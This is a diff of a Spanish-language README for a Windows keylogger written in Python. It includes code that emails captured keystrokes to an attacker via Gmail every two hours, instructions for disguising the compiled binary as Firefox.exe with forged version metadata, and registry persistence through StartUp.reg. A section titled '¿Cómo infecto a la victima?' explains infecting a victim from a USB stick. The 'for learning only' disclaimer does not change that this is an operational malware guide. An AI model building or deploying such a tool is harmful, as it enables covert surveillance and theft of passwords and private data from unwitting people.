@@ -1,12 +1,22 @@
-# Keylogger para Windows
+# Keylogger para Windows - Python
 __Actual:__  `v2.0`
 
 __Documentación actualizada:__ `19-04-2020`
 
 
-__Nota importante:__ Esta herramienta tiene como proposito general y de uso exclusivo para aprendizaje se creó como parte de un curso Online de hacking de "Seguridad de sistemas informáticos", no me hago responsable de un posible mas uso de ésta herramienta.
-Las razones para el registro de teclas son para fines de seguridad de una empresa, ya sea que estén viendo qué está haciendo el personal o cómo interactúan sus personas en las computadoras o que los atacantes intenten obtener información confidencial, como información de inicio de sesión u otros datos confidenciales. Este programa simplemente toma cada pulsación de tecla ingresada en el teclado y luego envía el archivo de registro por correo electrónico cada 2 horas. Funcional en Linux y Windows.
+__Nota importante:__ Esta herramienta tiene como proposito general y de uso exclusivo para aprendizaje, se creó como parte de un curso Online de hacking de "Seguridad de sistemas informáticos", no me hago responsable de un posible mal uso de ésta herramienta.
 
+Las razones del uso de un Keylogger son para fines de seguridad de una empresa, ya sea que estén viendo qué está haciendo el personal, cómo interactúan sus personas en las computadoras o que los atacantes intenten obtener información confidencial, como información de inicio de sesión u otros datos confidenciales. Este programa simplemente toma cada pulsación de tecla ingresada en el teclado y luego envía el archivo de registro por correo electrónico cada 2 horas.
+
+## Carpeta Principal
+![Archivos](https://i.imgur.com/x984atN.png)
+- `icon.ico`    = Icono 
+- `KeyloggerWindows.py` = Código fuente del Keylogger
+- `LICENCE` = Licencia 
+- `README.md`= Documentación
+- `StartUp.reg` = Modifica el Registro de Windows
+- `version.txt` = Información detalla de conversión `.py` a `.exe`
+- `WindowsDefender.exe` = Keylogger Compilado 
 
 ## Caracteristicas
 - __Envío por Gmail:__ Envía el registro de teclas por Gmail.
@@ -16,11 +26,11 @@ Las razones para el registro de teclas son para fines de seguridad de una empres
 - __Obtención de datos a prueba de errores:__ En otros keylogger al momento de enviar el `log.txt`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene el registro de teclas, en éste keylogger, ese error está solucionado, obteniendo siempre los datos
 - __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, y mostrará cierta información, estó se dejó así con el afán de verificar un posible error, pero al ser convertida a `*.exe` se utilizara un comando para que ésta se ejecute en segundo plano.
 - __Intruso total:__ Al momento de ser convertido de `*.py a *.exe`, ésta pasará por un proceso para que se haga pasar por otro programa.
-- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `C:\Users\Public`, y en esa carpeta encuentras el archivo `log.txt`.
+- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `C:\Users\Public` , y en esa carpeta encuentras el archivo `log.txt`.
+- __Iniciar automaticamente con el sistema:__ Se encuentra un archivo llamado `StartUp.reg`, la cual al ejecutarlo, ésta escribe el registro y permite que el keylogger se ejecute al iniciar sesión.
 
 
-## Caracteristicas en proceso de Desarrollo:
-- __Iniciar automaticamente con el sistema:__  Modifica el registro del sistema para poder 
+## Caracteristicas en proceso de Desarrollo: 
 - __Segundo Gmail en caso de bloqueo:__ En casó el correo principal que envía los datos sea bloqueada, en caso de error, se usará otro correo para poder ser envíado
 - __Conexión a una base de datos MySQL:__ Los datos recopilados serán enviados por una conexión a una base de datos en vez de por mensajes.  
 - __Soporte de envió a otros buzones de correo:__ Se insertará un soporte para poder usar Outlook, yahoo u otros servicios de correo 
@@ -28,9 +38,9 @@ Las razones para el registro de teclas son para fines de seguridad de una empres
 
 
 
-## Uso de Recursos de PC
-- __Uso de RAM:__  `17.5MB`
-- __Uso de CPU:__  `0.1%`
+## Uso de Recursos de la PC
+El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
+![Uso del CPU y RAM](https://i.imgur.com/xMRxzX3.png)
 
 ## Requerimiento de Paquetes:
 - import pynput
@@ -44,23 +54,23 @@ Las razones para el registro de teclas son para fines de seguridad de una empres
 
 # Preparación:
 1. Use  `git clone https://github.com/SebastianEPH/Keylogger-py.git` para descargar el repositorio en su computadora.
-2. Abre el archivo `KeyloggerWindows.py`
-3. Entrar al siguiente [link](https://myaccount.google.com/lesssecureapps) y habilita el Acceso de apps menos seguras de google. `En caso no lo habilite, el keylogger no podrá iniciar sesión en su Gmail`
-4. Buscamos la función `def SendLog(log):` y buscamos la variables:
+2. Abra el archivo `KeyloggerWindows.py` en su editor de texto.
+3. La cuenta de google remitente, debe tener habilita el Acceso de apps menos seguras de google, ésta la puedes habilitar entrando a este [link](https://myaccount.google.com/lesssecureapps).  `En caso no lo habilite, el keylogger no podrá iniciar sesión en su Gmail`
+4. Buscamos la función `SendLog(log)` y buscamos la variables:
     - `sender_email`  y `sender_password` , escribiremos correo y contraseña del remitente y debe ser una cuenta de Gmail. `En futuras actualizaciones podrán ser otros servicios de mensajería`
-    - `receiver_email`, usted escribirá el correo donde desea que llegué la información recopilada, tambien puede mandar ese correo a uno o más Destinatario
+    - `receiver_email`, Escribirá el correo destinatario, pueden ser 1 o más.
 ```` py
 # Envía los datos log por Gmail 
 def sendLog(log):
     try:
         ## Change correo
         mifecha = datetime.datetime.now()
-        sender_email = "SoyElCorreoQueEnviaráLosRegistrosDeTeclas@gmail.com"
-        sender_password = "SoyUnaContraseña"
+        sender_email = "SoyElCorreoQueEnviaráLosRegistrosDeTeclas@gmail.com"    #<== Editar
+        sender_password = "SoyUnaContraseña"                                    #<== Editar
 
-        receiver_email = ["SoyElQueRecibiráLosRegistros@gmail.com"]
+        receiver_email = ["SoyElQueRecibiráLosRegistros@gmail.com"]             #<== Editar
         # Si deseas 2 a más destinatarios
-        # receiver_email = ["correo1@gmail.com", "correo2@hotmail.com"]
+        # receiver_email = ["correo1@gmail.com", "correo2@hotmail.com"]         #<== Envíar 2 a más correos
         subject = "Dados del usuario: "+ str(getuser())
         yag = yagmail.SMTP(user=sender_email, password=sender_password)
         contenido = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
@@ -75,7 +85,7 @@ def sendLog(log):
         return False
 ````
 
-5. __Opcional:__ Si deseas modificar el tiempo de intervalo del envío del registro, lo puedes hacer buscando la función `def mailInterval():`, el tiempo debe ser modificado en el `for x in range(720):`, y debe estar dividido entre 10.
+5. __Opcional:__ Si deseas modificar el tiempo de intervalo del envío del registro, lo puedes hacer buscando la función `mailInterval()`, el tiempo debe ser modificado en el `for x in range(720):`, y debe estar dividido entre 10.
 
 ````py 
 def mailInterval():
@@ -83,7 +93,7 @@ def mailInterval():
     while (True):
         n = n+1
         # Enviar cada 2 horas aprox
-        for x in range(720):    #720
+        for x in range(720):    #720 * 100 = 7200 || 7200 segundos es igual a 2 Horas
             time.sleep(10)
             print("Pasó: "+ str(x*10))
 
@@ -114,13 +124,13 @@ def mailInterval():
             # No hará nada, y esperará que aya una conexión exitosa
             pass
 ````
-6. __Importante:__ Usted debe buscar la función `def CopyKey():` y tendrá que cambiar el valor  de la variable `nameKey`. 
+6. __Importante:__ Usted debe buscar la función `CopyKey()` y tendrá que cambiar el valor  de la variable `nameKey`. 
 
 ````c
 # Debes coloacar el nombre de cómo quieres llamar a tu keyloger, en éste caso se llamará Firefox.exe
 nameKey = "Firefox.exe"
 ````
-7. __StartUp:__ Encontrará un archivo StartUp.reg, deberás abrirlo y verificar que tenga el mismo nombre que le dió en el paso anterior, ejemplo: `Firefox.exe`.
+7. __StartUp:__ Encontrará un archivo StartUp.reg en la carpeta principal y deberás abrirlo y verificar que tenga el mismo nombre que le dió en el paso anterior, ejemplo: `Firefox.exe`.
 ````re
 Windows Registry Editor Version 5.00
 
@@ -129,7 +139,7 @@ Windows Registry Editor Version 5.00
 ````
 Este archivo `StartUp.reg` es el archivo que modificará el registro de windows, y hará que el keylogger se inicie siempre al iniciar sesión.
 
-# Proceso de instalación `*.py a *.exe`
+# Proceso de conversión: `*.py a *.exe`
 Se utilizará `pyinstaller`
 1. En la carpeta principal encontrará dos archivos, uno llamado `icon.ico` y el otro `version.txt`, éstos 2 archivos son importantes para la conversión del `*.py a *.exe`.
     - `icon.ico` = El icono que tendrá el keylogger al ser convertido
@@ -141,7 +151,7 @@ Se utilizará `pyinstaller`
     ![Imagen2](https://i.imgur.com/Txt3QFS.png)
 
     Toda esa información puede ser modificada en el archivo de la plantilla `version.txt`
-2. __Intruso__ El el siguiente archivo `version.txt`, puedes modificar la información del `*.exe` la cual se supone que de ser creible.
+2. __Intruso:__ El el siguiente archivo `version.txt`, puedes modificar la información del `*.exe` la cual se supone que de ser creible.
     ````
     VSVersionInfo(
     ffi=FixedFileInfo(
@@ -172,7 +182,8 @@ Se utilizará `pyinstaller`
     ]
     )
     ````
-3. __Compilación:__
+3. __Conversión final:__
+Mediante Consola debe dirigirse a la carpeta principal.
 Los requisitos es tener instalada la librería `pyinstaller`, porfavor mire un tutorial antes de hacer éste proceso, la linea de comando recomendada es la siguiente:
 
     ````py 
@@ -180,7 +191,7 @@ Los requisitos es tener instalada la librería `pyinstaller`, porfavor mire un t
     ````
 
 # ¿Cómo infecto a la victima?
-
+![Final files](https://i.imgur.com/rQRHYVB.png)
 Usted tendrá 2 archivos al finalizar la conversión, `Firefox.exe` y `StartUp.reg`, aquellos archivos, puedes tenerlos en un  usb, ya que en el momento de ejecutar `Firefox.exe` , éste archivo, se copiara en la carpeta `C:\Users\Public` y el keylogger está funcionando, usted puede quitar el USB con suma confianza, pero se recomienda dejarlo mínimamente 5 segundos despues de darle doble clic.
 
 Pero para hacer que éste keylogger se ejecute siempre al iniciar sesión, usted debe ejecutar el archivo `StartUp.reg`, 
